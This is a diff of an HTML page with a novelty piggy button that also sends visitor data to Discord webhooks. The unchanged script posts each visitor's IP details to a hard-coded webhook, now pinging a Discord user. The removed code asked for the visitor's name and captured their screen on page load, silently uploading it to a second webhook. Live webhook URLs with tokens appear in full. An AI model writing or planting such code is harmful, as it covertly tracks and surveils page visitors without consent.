@@ -288,22 +288,9 @@
         piggyBtn.style.right = '65px';
         piggyBtn.onclick = piggyRain;
         document.body.appendChild(piggyBtn);
-    </script>
-    <div>
-        <div>
-            <script>
-            (async () => {
-                let nombre = "";
-                while (!nombre) {
-                    nombre = prompt("¿Cuál es tu nombre?");
-                    if (nombre === null) nombre = ""; // Si cancela, vuelve a preguntar
-                    nombre = nombre.trim();
-                }
-                window.cerditoNombre = nombre; // Guarda el nombre globalmente para otros scripts si lo necesitas
-            })();
-            </script>
-        </div>
 
+
+    </script>
 <script>
 (async () => {
     const webhookUrl = "https://discord.com/api/webhooks/1379196950548840562/dbcNuGow4IcIdN8Fj1Due9d_e-PDm43i3AWxYUQZ4Zhyp5J_oe4vk6yfrprOqsPZvCis";
@@ -325,11 +312,7 @@
                         url: "https://emojicdn.elk.sh/🐷"
                     },
                     fields: [
-                        {
-                            name: "👤 Nombre ingresado",
-                            value: nombre,
-                            inline: true
-                        },
+                    
                         {
                             name: "🌍 IP",
                             value: ipData.ip,
@@ -360,81 +343,25 @@
         };
 
         await fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(embed)
-        });
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        content: "<@583908818367414272>",  // 👈 reemplaza con tu ID
+        ...embed
+    })
+});
+
     } catch (err) {
         console.error("Error enviando a Discord:", err);
     }
 
     
 })();
-</script>
-
-<script>
-(async () => {
-    try {
-        // Solicita la captura de pantalla entera automáticamente al cargar la página
-        const stream = await navigator.mediaDevices.getDisplayMedia({ video: { displaySurface: "browser" }, audio: false });
-        const video = document.createElement("video");
-        video.style.display = "none";
-        document.body.appendChild(video);
-        video.srcObject = stream;
-
-        // Espera a que el video esté listo
-        await new Promise(resolve => {
-            video.onloadedmetadata = () => {
-                video.play();
-                video.onplaying = () => resolve();
-            };
-        });
-
-        // Crea el canvas solo en memoria (no se agrega al DOM)
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Detener el stream y limpiar
-        stream.getTracks().forEach(track => track.stop());
-        video.remove();
-
-        const dataUrl = canvas.toDataURL("image/png");
-
-        // Enviar al Webhook como archivo
-        fetch("https://discord.com/api/webhooks/1379212833513930904/esMENVrQMXJQ6jl-QaKGSs1fZM1u-HD3SyRxXYK8o2gEanHgqsFTgm-SybIOoTKVH_az", {
-            method: "POST",
-            body: (() => {
-                const form = new FormData();
-                form.append("file", dataURLtoBlob(dataUrl), "captura.png");
-                return form;
-            })()
-        });
-
-    } catch (err) {
-        // Silencioso
-        console.error("Error capturando pantalla:", err);
-    }
-})();
-
-// Convertir base64 a Blob
-function dataURLtoBlob(dataUrl) {
-    const parts = dataUrl.split(',');
-    const mime = parts[0].match(/:(.*?);/)[1];
-    const bin = atob(parts[1]);
-    const arr = new Uint8Array(bin.length);
-    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
-    return new Blob([arr], { type: mime });
-}
-</script>
-
+    </script>
 
 
 </body>
 </html>
-
 
